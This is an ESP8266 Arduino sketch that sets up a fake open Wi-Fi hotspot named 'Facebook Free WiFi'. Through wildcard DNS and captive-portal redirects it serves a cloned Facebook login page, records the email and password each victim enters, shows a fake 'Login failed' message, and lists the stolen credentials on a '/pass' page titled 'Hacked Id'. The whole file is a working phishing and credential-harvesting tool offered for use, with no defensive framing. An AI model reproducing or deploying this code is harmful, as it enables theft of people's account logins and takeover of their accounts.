#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

const char* ssid = "Facebook Free WiFi";
DNSServer dnsServer;
ESP8266WebServer server(80);

String capturedCredentials[10];
int credentialCount = 0;

const int LED_PIN = 2;

void blinkLED(int times) {
  for (int i = 0; i < times; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(300);
    digitalWrite(LED_PIN, HIGH);
    delay(300);
  }
}

void handleRoot() {
  server.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
         <meta charset="UTF-8">
         <meta name="viewport"         content="width=device-width, initial-scale=1.0,  maximum-scale=1.0, user-scalable=no">
      <title>Log in to Facebook</title>
  <style>
    * {
      padding: 0px;
      margin: 0;
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }    
    body {
     background-color: #f0f2f5;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
     align-items: center;
    }
    .wrapper {
      display: flex;
      max-width: 90px;
      width: 50%;
      padding: 200px;
      justify-content: space-between;
      align-items: center;
    }
    .logo-section {
      flex: 10;
      padding-right: 320px;
      transform: translateY(-200%);
    }
    .logo {
   color: #1877f2;
      font-size: 0rem;
      font-weight: bold;
      line-height: ;
      margin-bottom: 0px;
    }

    

    .login-form {

      background-color: #fff;

      border-radius: 10px;

      box-shadow: 4px 2px 4px rgba(1, 0, 0, 0.1), 2px 8px 16px rgba(0, 0, 0, 0.1);

      padding: 30px;

      width: 330px;

      flex-shrink: 0;

    }

    

    .login-form input {

      width: 100%;

      padding: 14px 16px;

      margin-bottom: 12px;

      border: 1px solid #dddfe2;

      border-radius: 10px;

      font-size: 15px;

    }

    

    .login-btn {

      background-color: #1877f2;

      border: none;

      border-radius: 10px;

      color: #fff;

      font-size: 20px;

      font-weight: bold;

      line-height: 48px;

      padding: 0 16px;

      width: 100%;

      margin-bottom: 16px;

      cursor: pointer;

    }

    

    .login-btn:hover {

      background-color: #166fe5;

    }

    

    .forgot-password {

      color: #1877f2;

      display: block;

      font-size: 14px;

      text-align: center;

      text-decoration: none;

      margin-bottom: 20px;

    }

    

    .divider {

      border-bottom: 2px solid #dadde1;

      margin: 15px 15px;

    }

    

    .create-account {

      background-color: #42b72a;

      border: none;

      border-radius: 10px;

      color: #fff;

      cursor: pointer;

      font-size: 17px;

      font-weight: bold;

      line-height: 48px;

      padding: 0 16px;

      margin: 0 auto;

      display: block;

    }

    

    .create-account:hover {

      background-color: #36a420;

    }

    

    @media (max-width: 900px) {

      body {

        overflow: auto;

      }
      .wrapper {
        flex-direction: column;
        text-align: center;
        padding: 40px 20px;
      }
      .logo-section {
        padding-right: 0;
        margin-bottom: 10px;
        transform: none;
      }
      .logo {
       font-size: 3rem;
      }
   }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="logo-section">
      <h1 class="logo">facebook</h1>
   </div>
    <div class="login-form">
      <form action="/login" method="POST">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="pass" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="divider"></div>
        <button type="button" class="create-account">Create New Account
        </button>
      </form>
    </div>
  </div>
</body>
</html>
  )rawliteral");
}

void handleNotFound() {
  server.sendHeader("Location", "http://" + server.client().localIP().toString(), true);
  server.send(302, "text/plain", "");
}

void handleGenerate_204() {
  server.sendHeader("Location", "http://" + server.client().localIP().toString(), true);
  server.send(302, "text/plain", "");
}

void handleHotspot_detect() {
  server.sendHeader("Location", "http://" + server.client().localIP().toString(), true);
  server.send(302, "text/plain", "");
}

void handleLogin() {
  String email = server.arg("email");
  String pass = server.arg("pass");

  capturedCredentials[credentialCount % 10] = "Email: " + email + " | Pass: " + pass;
  credentialCount++;

  blinkLED(5);

  server.send(200, "text/html", "<script>alert('Login failed. Please check your email and password.');history.back();</script>");
}

void handlePassPage() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Hacked Id</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background-color: #f0f2f5;
      height: 100vh;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      height: calc(100vh - 40px);
      overflow: auto;
    }
    h1 {
      color: #1877f2;
      margin-bottom: 20px;
      text-align: center;
    }
    .count {
      font-weight: bold;
      margin-bottom: 15px;
      text-align: center;
    }
    ul {
      list-style-type: none;
      padding: 0;
    }
    li {
      background: #f0f2f5;
      margin-bottom: 10px;
      padding: 15px;
      border-radius: 8px;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Captured Credentials</h1>
    <div class="count">Total: )rawliteral";
  
  page += credentialCount;
  page += R"rawliteral(</div>
    <ul>)rawliteral";
  
  for (int i = 0; i < min(credentialCount, 10); i++) {
    page += "<li>" + capturedCredentials[i] + "</li>";
  }
  
  page += R"rawliteral(
    </ul>
  </div>
</body>
</html>)rawliteral";
  
  server.send(200, "text/html", page);
}

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/generate_204", handleGenerate_204);
  server.on("/hotspot-detect.html", handleHotspot_detect);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/pass", handlePassPage);
  server.onNotFound(handleNotFound);

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
